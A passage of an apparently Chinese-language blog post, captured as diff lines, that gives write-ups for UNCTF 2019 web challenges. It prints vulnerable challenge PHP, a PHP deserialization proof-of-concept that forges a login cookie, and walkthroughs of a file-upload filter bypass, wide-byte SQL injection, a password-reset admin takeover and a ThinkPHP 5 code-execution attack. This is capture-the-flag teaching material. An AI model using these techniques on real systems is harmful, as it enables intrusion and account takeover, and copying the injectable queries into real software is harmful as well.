yIGVsZW1lbnQgPSBsYXl1aS5lbGVtZW50OwoKICAgICAgICAgICAgZWxlbWVudC5vbignbmF2KGRlbW8pJywgZnVuY3Rpb24oZWxlbSkgewogICAgICAgICAgICAgICAgbGF5ZXIubXNnKGVsZW0udGV4dCgpKTsKICAgICAgICAgICAgfSk7CiAgICAgICAgfSk7CiAgICAgICAgd2luZG93Lmdsb2JhbCA9IHsKICAgICAgICAgICAgcGFnZVR5cGU6ICdkZW1vJywKICAgICAgICAgICAgcHJldmlldzogZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICB2YXIgcHJldmlldyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdMQVlfcHJldmlldycpOwogICAgICAgICAgICAgICAgcmV0dXJuIHByZXZpZXcgPyBwcmV2aWV3LmlubmVySFRNTCA6ICcnOwogICAgICAgICAgICB9CiAgICAgICAgfTsKICAgCAgICA8L3NjcmlwdD4KICAgIDwvZGl2PgoKCgo8L2JvZHk+PC9odG1sPg==&quot;);
+}
+
+?&gt;
+</code></pre>
+<p><strong>db.php</strong></p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+class db{
+
+    public function init() {
+        $con = mysql_connect(&quot;localhost:3306&quot;,&quot;dog&quot;,&quot;123456&quot;);
+        if(!$con) {
+            die(&quot;Connect failed: &quot; . mysql_error());
+        }
+        return $con;
+    }
+
+    public function user_check($u, $p, $obj) {
+        $sql = &quot;SELECT id,username FROM users WHERE username = &#39;$u&#39; and password = &#39;$p&#39;&quot;;
+        $con = $this-&gt;init();
+        mysql_select_db(&quot;unctf&quot;, $con);
+        $result = mysql_query($sql,$con);
+        $row = mysql_fetch_array($result);
+        if(count($row) &gt;= 4) {
+            $obj-&gt;id = intval($row[&#39;id&#39;]);
+            $obj-&gt;username = $row[&#39;username&#39;];
+            $serstr = serialize($obj);
+            $serstr = cookie_encode($serstr);
+
+            setcookie(&#39;identy&#39;, $serstr);
+            echo(&#39;&lt;script&gt;alert(&quot;Login Success&quot;);window.location.href=&quot;./home.php?m=index&quot;;&lt;/script&gt;&#39;);
+        }
+        else {
+            die(&#39;&lt;script&gt;alert(&quot;Login Fail&quot;);window.location.href=&quot;./index.php&quot;;&lt;/script&gt;&#39;);
+        }
+    }
+
+    public function index_check($i, $u) {
+        $sql = &quot;SELECT id,username FROM users WHERE username = &#39;$u&#39; and id = $i&quot;;
+        $con = $this-&gt;init();
+        mysql_select_db(&quot;unctf&quot;, $con);
+        $result = mysql_query($sql,$con);
+        $row = mysql_fetch_array($result);
+        if(count($row) &lt; 4) {
+            setcookie(&quot;identy&quot;, &quot;&quot;);
+            die(&#39;&lt;script&gt;alert(&quot;Identity problems, please relogin&quot;);window.location.href=&quot;./index.php&quot;;&lt;/script&gt;&#39;);
+        }
+    }
+}
+
+?&gt;
+</code></pre>
+<p><strong>debug.php</strong></p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+class debug{
+
+    public $choose = 0;
+    public $forbidden = &quot;Good Luck :|&quot;;
+    public $access_token = &quot;&quot;;
+    public $ob = NULL;
+
+    public function __construct($obj, &amp;$d) {
+        $this-&gt;vt($obj, $d);
+        if($this-&gt;ob-&gt;username !== &quot;debuger&quot;) {
+            setcookie(&quot;identy&quot;, &quot;&quot;);
+            die(&#39;&lt;script&gt;alert(&quot;Identity problems, please relogin&quot;);window.location.href=&quot;./index.php&quot;;&lt;/script&gt;&#39;);
+        }
+    }
+
+    public function vt($obj, &amp;$d) {
+        if($this-&gt;ob != $obj) {
+            $this-&gt;ob = $obj;
+        }
+        if(!($obj instanceof session)) {
+            $d = $obj;
+        }
+    }
+
+    public function __toString() {
+        if($this-&gt;access_token === &quot;&quot;) {
+            include(&quot;flag.php&quot;);
+        }
+    }
+
+    public function debug($obj, &amp;$d) {
+        $this-&gt;vt($obj, $d);
+        check1($this-&gt;ob);
+        if($this-&gt;choose === 0) {
+            $this-&gt;choose = $this-&gt;ob-&gt;choose;
+        }
+        if($this-&gt;choose !== 1) {
+            if($this-&gt;choose === 2) {
+                die(&#39;&lt;script&gt;alert(&quot;This is a forbidden option&quot;);window.location.href=&quot;./home.php?m=debug&quot;;&lt;/script&gt;&#39;);
+            }
+        }
+
+        switch($this-&gt;choose)
+        {
+        case 1:
+            echo &quot;You like hsy :(&quot;;
+            break;
+        case 2:
+            echo $this-&gt;forbidden;
+            break;
+        default:
+            echo &quot;Good debuger :)&quot;;
+        }
+
+    }
+
+    public function __destruct() {
+        echo &#39;&#39;;
+    }
+}
+
+?&gt;
+</code></pre>
+<p>通读一遍代码，发现是反序列化的漏洞，漏洞点在<strong>debug.php</strong>的<strong>debug类</strong>的<strong>__tostring()魔术方法</strong>中，可以直接<strong>include flag</strong>而调用它的在<strong>debug方法</strong>中的<strong>echo $this-&gt;forbidden</strong>，最后<strong>$forbidden</strong>必须是<strong>debug类</strong>的实例</p>
+<p>这里要执行<strong>$this-&gt;forbidden</strong>需要<strong>$this-&gt;choose=2</strong>，因为<strong>switch()</strong>是弱类型比较，所以这里可以用<strong>“2”</strong>绕过</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-6.png" alt="3-6"></p>
+<p>而使用<strong>debug-&gt;debug()</strong>是在<strong>home.php</strong>中</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-7.png" alt="3-7"></p>
+<p>进入这个<strong>else</strong>的条件是<strong>$mothed</strong>不等于<strong>login、index、logout</strong>，而 $mothed 就是通过<strong>GET</strong>到的<strong>m</strong></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-8.png" alt="3-8"></p>
+<p>我们按 else 的每一步分析</p>
+<p>① 第一步：经过<strong>func.php-&gt;mothed_waf()</strong>的检查</p>
+<pre><code class="php">mothed_waf($mothed);
+</code></pre>
+<p>可以看到我们可以大小写绕过 base64、php、write ，但无法绕过 flag，所以无法直接包含</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-9.png" alt="3-9"></p>
+<p>② 第二步：为 $mothed 添加 .php 的后缀并且<strong>include</strong></p>
+<pre><code class="php">$page = $mothed . &quot;.php&quot;;
+include($page);
+</code></pre>
+<p>这里我们就需要使得 $mothed=debug 因为这样 include(debug.php)，作用域内才会有 debug 类，不然所有操作都是徒劳</p>
+<p>③ 第三步：调用<strong>func.php-&gt;check()</strong></p>
+<pre><code class="php">check($cookie, $db, $session);
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-10.png" alt="3-10"></p>
+<p>首先<strong>$str（也就是home.php-&gt;$cookie）</strong>不能为空。然后调用了<strong>func.php-&gt;cookie_decode()</strong>来解码 $str ，这个函数不必太多理解，因为加密和解密函数都是自带的，会用就行</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-11.png" alt="3-11"></p>
+<p>将解密的内容赋值给<strong>$objstr</strong>，然后反序列化了 $objstr ，赋值给<strong>$session</strong>，并且对 $session-username 调用<strong>func.php-&gt;waf()</strong>进行检查</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-12.png" alt="3-12"></p>
+<p>我们这里需要看一下那个类有<strong>id、username</strong>属性，发现是<strong>session.php-&gt;session类</strong></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-13.png" alt="3-13"></p>
+<p>接下来调用<strong>db.php-&gt;index_check()</strong>方法</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-14.png" alt="3-14"></p>
+<p>对<strong>$u($session-&gt;id)</strong>和<strong>$i($session-&gt;username)</strong>进行查询，结果少于 4 条时退出。结合如下代码，我们猜测正常用户数据库的查询结果应该就在 4 条或以上，所以这里只要是数据库有的用户就行了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-15.png" alt="3-15"></p>
+<p>④ 创建 debug 类</p>
+<pre><code class="php">$d = new debug($session, $d);
+$d-&gt;vt($session, $d);
+$d-&gt;debug($session);
+</code></pre>
+<p>类中有<strong>__construct()魔术方法</strong>、<strong>vt()</strong>和<strong>debug()</strong>方法，所以我们控制的<strong>$session</strong>变量必须是<strong>debug类</strong>的序列化，才有后面的<strong>debug()</strong>方法可以执行</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-16.png" alt="3-16"></p>
+<p>所以前面的<strong>func.php-&gt;check()</strong>中检查的<strong>$id</strong>和<strong>$username</strong>自己添加了，并且 $id 需要猜，因为我们并不知道，先试一下1</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-17.png" alt="3-17"></p>
+<p>数据库查询无结果，尝试 2 时就对了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-18.png" alt="3-18"></p>
+<p>但是有了新的问题，提示<strong>token error</strong>，并且<strong>include(‘access.php’)</strong>，应该是这个<strong>access.php</strong>搞的鬼。先拿源码，但是像之前那样伪协议拿时，发现过滤了<strong>access</strong>，并且无法大小写绕过。最后通过下载<strong>access.php.bak</strong>备份文件才拿到源码</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+$hack_token = &#39;3ecReK&amp;key&#39;;
+try {
+    $d = unserialize($this-&gt;funny);
+} catch(Exception $e) {
+    echo &#39;&#39;;
+}
+?&gt;
+</code></pre>
+<p>在添加一个<strong>funny属性</strong>，带着<strong>hack_token</strong>，最终 POC 如下</p>
+<pre><code class="php">&lt;?php
+
+function cookie_encode($str) {
+    $key = base64_encode($str);
+    $key = bin2hex($key);
+    $arr = str_split($key, 2);
+    $cipher = &#39;&#39;;
+    foreach($arr as $value) {
+        $num = hexdec($value);
+        $num = $num + 240;
+        $cipher = $cipher.&#39;&amp;&#39;.dechex($num);
+    }
+    return $cipher;
+}
+
+class debug{
+
+    public $choose = &quot;2&quot;;
+    public $forbidden = &quot;&quot;;
+    public $access_token = &quot;&quot;;
+    public $ob = NULL;
+    public $id = 2;
+    public $username = &quot;debuger&quot;;
+    public $funny = &#39;O:5:&quot;debug&quot;:4:{s:6:&quot;choose&quot;;s:1:&quot;2&quot;;s:9:&quot;forbidden&quot;;s:0:&quot;&quot;;s:12:&quot;access_token&quot;;s:10:&quot;3ecReK&amp;key&quot;;s:2:&quot;ob&quot;;N;}&#39;;
+
+    public function __construct()
+    {
+        $this-&gt;forbidden = unserialize(&#39;O:5:&quot;debug&quot;:4:{s:6:&quot;choose&quot;;s:1:&quot;2&quot;;s:9:&quot;forbidden&quot;;s:0:&quot;&quot;;s:12:&quot;access_token&quot;;s:0:&quot;&quot;;s:2:&quot;ob&quot;;N;}&#39;);
+    }
+}
+
+$poc = new debug();
+echo cookie_encode(serialize($poc))
+?&gt;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-19.png" alt="3-19"></p>
+<h2 id="simple-web"><a href="#simple-web" class="headerlink" title="simple_web"></a>simple_web</h2><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/4-1.png" alt="4-1"></p>
+<p>存在<strong>robots.txt</strong></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/4-2.png" alt="4-2"></p>
+<p>访问<strong>getsandbox.php</strong>，得到如下代码</p>
+<pre><code class="php">&lt;?php
+if (isset($_GET[&#39;reset&#39;])) {
+    exec(&#39;/bin/rm -rf &#39; . $sandbox);
+    echo &quot;your sandbox has been reset&quot;;
+} else {
+    $sandbox = &#39;./sandbox/&#39; . md5(&quot;chris&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);
+    @mkdir($sandbox);
+    @chdir($sandbox);
+    echo &quot;your sandbox is &quot; . $sandbox . &quot;/&quot;;
+    yoursandboxis . /sandbox / 3010ba866ddd187c866a2513799b0934 /
+?&gt;
+</code></pre>
+<p>可以创建属于自己的沙盒，访问后发现如下代码</p>
+<pre><code class="bash">http://112.74.37.15:8001/sandbox/3010ba866ddd187c866a2513799b0934/
+</code></pre>
+<pre><code class="php">&lt;?php
+$str = addslashes($_GET[&#39;content&#39;]);
+$file = file_get_contents(&#39;content.php&#39;);
+$file = preg_replace(&#39;|\$content=\&#39;.*\&#39;;|&#39;, &quot;\$content=&#39;$str&#39;;&quot;, $file);
+file_put_contents(&#39;content.php&#39;, $file);
+highlight_file(__FILE__);
+?&gt; 
+</code></pre>
+<p>传入的<strong>$_GET[‘content’]</strong>会使用<strong>addslashes</strong>过滤，最后语句为</p>
+<pre><code class="bash">file_put_contents(&#39;content.php&#39;,&quot;$content=&#39;$str&#39;&quot;);
+</code></pre>
+<p>做一半发现环境关了。。。</p>
+<h2 id="simple-upload"><a href="#simple-upload" class="headerlink" title="simple_upload"></a>simple_upload</h2><p>代码</p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+@mkdir(&quot;./upload&quot;);
+
+if (isset($_POST[&#39;submit&#39;])) {
+        $is_upload = false;
+        $text = null;
+        if(!empty($_FILES[&#39;upload_file&#39;])){
+            $allow_type = array(&#39;image/jpeg&#39;,&#39;image/png&#39;,&#39;image/gif&#39;);
+            if(!in_array($_FILES[&#39;upload_file&#39;][&#39;type&#39;],$allow_type)){
+                $text = &quot;type forbidden&quot;;
+            }else{
+                $file = empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;];
+                $temp_name = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+                if (!is_array($file)) {
+                    $file = explode(&#39;.&#39;, strtolower($file));
+                }
+
+                $ext = end($file);
+                $allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
+                if (!in_array($ext, $allow_suffix)) {
+                    $text = &quot;ext forbidden&quot;;
+                }else{
+                    $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];
+                    $img_path = &quot;./upload&quot; . &#39;/&#39; .$file_name;
+                    if (mb_strpos(file_get_contents($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]), &quot;&lt;?&quot;) !== FALSE) {
+                        $text = &quot;hacker&quot;;
+                    }else{
+                        if(file_exists($img_path)){
+                            $text = &quot;file exist already&quot;;
+                        }else{
+                            if (move_uploaded_file($temp_name, $img_path)) {
+                                $text = &quot;upload succeed&quot;;
+                                $is_upload = true;
+                            } else {
+                                $text = &quot;upload failed&quot;;
+                            }
+                        }
+                    }
+                }
+            }
+        }else{
+            $text = &quot;please upload your file&quot;;
+        }
+}
+?&gt; 
+</code></pre>
+<p>先做个简单测试</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/5-1.png" alt="5-1"></p>
+<p>这题的关键点在于<strong>move_uploaded_file()</strong>函数会自动递归删除最后的<strong>/.</strong>字符串（或者 Windows 环境下自动删除文件名最后的<strong>.</strong>）</p>
+<pre><code class="php">move_uploaded_file($temp_name, $img_path)
+</code></pre>
+<p>当我们有传入<strong>$_POST[‘save_name’]</strong>时，并且是一个数组，<strong>$file</strong>这个变量就可以是一个数组，并且内容随意控制，无需受<strong>explode()</strong>控制，思路：</p>
+<p>① 令数组的最后一个参数为允许的后缀，比如 jpg</p>
+<p>② 令<strong>$file[count($file) - 1]</strong>为空，这样<strong>$file_name</strong>等于“数组的第一位 + <strong>.</strong>”，然后我们使数组的第一位为“文件名 + <strong>/</strong>”，这样传入 move_uploaded_file() 函数中时，就是“文件名 + <strong>/.</strong>”，后面的<strong>/.</strong>就会被处理掉。看一下 count() 对数组处理的漏洞，对没有赋值的数组元素不计算，所以可以利用这一点来使得<strong>$file[count($file) - 1]</strong>为空</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/5-3.png" alt="5-3"></p>
+<p>最后结果</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/5-4.png" alt="5-4"></p>
+<p>连接后在根目录下拿到 flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/5-5.png" alt="5-5"></p>
+<h2 id="光坂镇的小诗1"><a href="#光坂镇的小诗1" class="headerlink" title="光坂镇的小诗1"></a>光坂镇的小诗1</h2><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/6-1.png" alt="6-1"></p>
+<p>点击对应的名字发现参数 id 会变，加单引号之后发现会被添加反斜杠转义掉，猜想会不会是<strong>宽字节注入</strong>，用<strong>%df</strong>，被解析成一个字符，成功</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/6-2.png" alt="6-2"></p>
+<p>邮件查看源码，可以通过<strong>img</strong>标签的<strong>src</strong>来注入。发现单引号包裹</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/6-3.png" alt="6-3"></p>
+<p>联合注入测试成功</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/6-4.png" alt="6-4"></p>
+<p>注表名</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/6-5.png" alt="6-5"></p>
+<p>由于不能使用<strong>引号</strong>，所以这里直接<strong>select * from flag</strong>，然后用<strong>limit</strong>输出，拿到 flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/6-6.png" alt="6-6"></p>
+<h2 id="NSB-Reset-Password"><a href="#NSB-Reset-Password" class="headerlink" title="NSB_Reset_Password"></a>NSB_Reset_Password</h2><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/7-1.png" alt="7-1"></p>
+<p>注册一个普通用户，登录后给了提示</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/7-2.png" alt="7-2"></p>
+<p>重置普通用户的密码，果然收到邮件。输入验证码，来到重改密码的界面，先放着</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/7-3.png" alt="7-3"></p>
+<p>然后此时再新开一个窗口，回到上一个忘记密码的页面，用户名填写 admin</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/7-5.png" alt="7-5"></p>
+<p>然后系统会发送邮件，我们虽然拿不到验证码，但是此时服务器后台更改密码的用户变为 admin。我们此时只要在第一个重新设置密码的界面修改密码，改的就是 admin 的密码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/7-4.png" alt="7-4"></p>
+<p>admin 登陆拿到 flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/7-6.png" alt="7-6"></p>
+<h2 id="easy-pentest"><a href="#easy-pentest" class="headerlink" title="easy_pentest"></a>easy_pentest</h2><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/8-1.png" alt="8-1"></p>
+<p>根据题目提示<strong>thinkphp</strong>，扫描 thinkphp 后台日志，果然存在<strong>[ip]/runtime/log/201909/02.log</strong></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/8-3.png" alt="8-3"></p>
+<p>注意其中有<strong>safe_key</strong>参数以及它的值，将它们添加到URL中，进入<strong>Sage Page</strong></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/8-2.png" alt="8-2"></p>
+<p>然后在返回的页面中，看到<strong>Think PHP V5</strong></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/8-4.png" alt="8-4"></p>
+<p>参考文章：<a href="https://xz.aliyun.com/t/6106#toc-4?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener"> 记一次有趣的tp5代码执行 </a></p>
+<p>payload 直接打</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/8-5.png" alt="8-5"></p>
+<p>在<strong>/home</strong>下发现 flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/8-6.png" alt="8-6"></p>
+<p><strong>file</strong>字符串不能用，<strong>show_source</strong>拿到 flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/8-7.png" alt="8-7"></p>
+<hr>
+<p><strong>Reference</strong></p>
+<p> <a href="https://xz.aliyun.com/t/6106#toc-4?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">https://xz.aliyun.com/t/6106#toc-4?tdsourcetag=s_pcqq_aiomsg</a></p>
+<p> <a href="https://xz.aliyun.com/t/6661#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/6661#toc-10</a> </p>
+<hr>
+<p><strong>WriteUp</strong></p>
+<p> <a href="https://www.ctfwp.com/articals/2019unctf.html" target="_blank" rel="noopener">https://www.ctfwp.com/articals/2019unctf.html</a> </p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/knlvre.github.io/statics/forhim.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ico/HaZong.jpg" height=300 width=300></img>
+                    <p>Knlvre</p>
+                    <span>Notes During Information Security Learning.</span>
+                    <dl>
+                        <dd><a href="https://github.com/knlvre" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://github.com/knlvre" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://github.com/knlvre" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">61 <p>Articles</p></a></li>
+                    <li><a href="/categories">0 <p>Categories</p></a></li>
+                    <li><a href="/tags">9 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>Contents</h4>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UNCTF"><span class="toc-number">1.</span> <span class="toc-text">UNCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass"><span class="toc-number">1.1.</span> <span class="toc-text">bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Do-you-like-xml"><span class="toc-number">1.2.</span> <span class="toc-text">Do you like xml?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#K-amp-K战队的老家"><span class="toc-number">1.3.</span> <span class="toc-text">K&amp;K战队的老家</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-web"><span class="toc-number">1.4.</span> <span class="toc-text">simple_web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-upload"><span class="toc-number">1.5.</span> <span class="toc-text">simple_upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#光坂镇的小诗1"><span class="toc-number">1.6.</span> <span class="toc-text">光坂镇的小诗1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSB-Reset-Password"><span class="toc-number">1.7.</span> <span class="toc-text">NSB_Reset_Password</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-pentest"><span class="toc-number">1.8.</span> <span class="toc-text">easy_pentest</span></a></li></ol></li></ol>
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2019
+        <span class="gradient-text">
+            Knlvre
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+    <link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+    <script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/knlvre.github.io/js/plugin.js"></script>
+<script src="/knlvre.github.io/js/obsidian.js"></script>
+<script src="/knlvre.github.io/js/jquery.truncate.js"></script>
+<script src="/knlvre.github.io/js/search.js"></script>
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+    <script src="/knlvre.github.io/js/busuanzi.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
